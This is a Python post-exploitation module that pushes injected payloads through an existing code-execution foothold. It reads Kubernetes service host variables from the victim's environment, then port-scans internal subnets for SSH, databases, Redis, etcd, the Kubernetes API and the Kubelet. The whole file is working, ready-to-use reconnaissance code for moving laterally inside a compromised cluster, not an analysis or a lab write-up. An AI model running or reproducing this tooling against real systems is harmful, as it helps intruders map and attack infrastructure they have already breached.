import ast

def run(exploit, target=None):
    print(f"\n[ SYSTEM SCAN: HIGH-SPEED DNS-AWARE DISCOVERY ]")
    
    # 1. Input Sanitization
    if isinstance(target, list) and len(target) > 0:
        target = target[0]
    
    # 2. Target Normalization & Host Counting
    num_hosts = 0
    if not target:
        print("[*] No target provided. Enumerating environment...")
        discovery_payload = (
            "(lambda: (lambda os: str([v for k,v in os.environ.items() if k.endswith('_SERVICE_HOST')]))(__import__('os')))()"
        )
        
        raw_discovery = exploit.execute(discovery_payload)
        try:
            discovered_ips = list(set(ast.literal_eval(raw_discovery)))
            if not discovered_ips:
                target_label = "10.217.4.1/24 (Default)"
                num_hosts = 254
                host_list_code = "[f'10.217.4.{i}' for i in range(1, 255)]"
            else:
                num_hosts = len(discovered_ips)
                target_label = "Environment Services"
                host_list_code = str(discovered_ips)
        except:
            target_label = "10.217.4.0/24 (Fallback)"
            num_hosts = 254
            host_list_code = "[f'10.217.4.{i}' for i in range(1, 255)]"
    else:
        # Manual Target logic
        target_str = str(target).strip()
        target_label = target_str
        
        if '/' in target_str:
            ip_base, mask_str = target_str.split('/')
            mask = int(mask_str)
            num_hosts = 1 << (32 - mask)
            
            ip_parts = [int(x) for x in ip_base.split('.')]
            ip_int = (ip_parts[0] << 24) + (ip_parts[1] << 16) + (ip_parts[2] << 8) + ip_parts[3]
            network_base = ip_int & (0xffffffff << (32 - mask))
            
            host_list_code = f"[f'{{(n>>24)&255}}.{{(n>>16)&255}}.{{(n>>8)&255}}.{{n&255}}' for n in range({network_base}, {network_base + num_hosts})]"
        else:
            num_hosts = 1
            host_list_code = f"['{target_str}']"

    print(f"Targeting : {target_label}")
    print(f"Hosts     : {num_hosts} addresses identified")
    print(f"Strategy  : List Comprehension + Resilient FQDN Lookup \n")
    
    ports = [22, 80, 443, 2379, 3306, 5432, 6379, 6443, 8080, 8443, 10250]
    
    # 3. THE RESILIENT PAYLOAD
    # We use socket.getfqdn(ip) because it returns the IP itself if no DNS name is found, 
    # preventing the 'No address associated with name' crash.
    scanner_payload = (
        "["
        "f'{ip}:{p}:{ (lambda: (lambda s: s.getfqdn(ip))(__import__(\"socket\")))() }' "
        f"for ip in {host_list_code} "
        f"for p in {ports} "
        "for res in [(lambda: (lambda s: ("
        "  s.settimeout(0.05) or "
        " (s.connect_ex((ip, p)) == 0)"
        "))(__import__('socket').socket(2,1)))()] "
        "if res is True"
        "]"
    )

    # 4. Execution
    output = exploit.execute(scanner_payload)
    
    # 5. Output Parsing
    try:
        hits = ast.literal_eval(output)
        service_map = {22:"SSH", 80:"HTTP", 443:"HTTPS/API", 2379:"etcd", 3306:"MySQL", 5432:"Postgres", 6379:"Redis", 6443:"K8s-API", 8080:"HTTP-Alt", 8443:"HTTPS-Alt", 10250:"Kubelet"}

        print(f"{'IP ADDRESS':<16} {'PORT':<8} {'RESOLVED NAME / SERVICE'}")
        print(f"{'-----------':<16} {'----':<8} {'-----------------------'}")

        if hits:
            for hit in sorted(hits):
                parts = hit.split(':')
                if len(parts) >= 3:
                    ip, p_str, fqdn = parts[0], parts[1], parts[2]
                    # If fqdn is the same as IP, it means no record was found
                    name_display = fqdn if fqdn != ip else "no-dns-record"
                    svc_name = service_map.get(int(p_str), 'Unknown')
                    print(f"{ip:<16} {p_str:<8} {name_display} ({svc_name})")
        else:
            print(f"No active services found.")

    except Exception as e:
        print(f"Error parsing results: {e}")
        print(f"Raw Output: {output[:300]}")

    print(f"\n[ Scan Complete ]\n")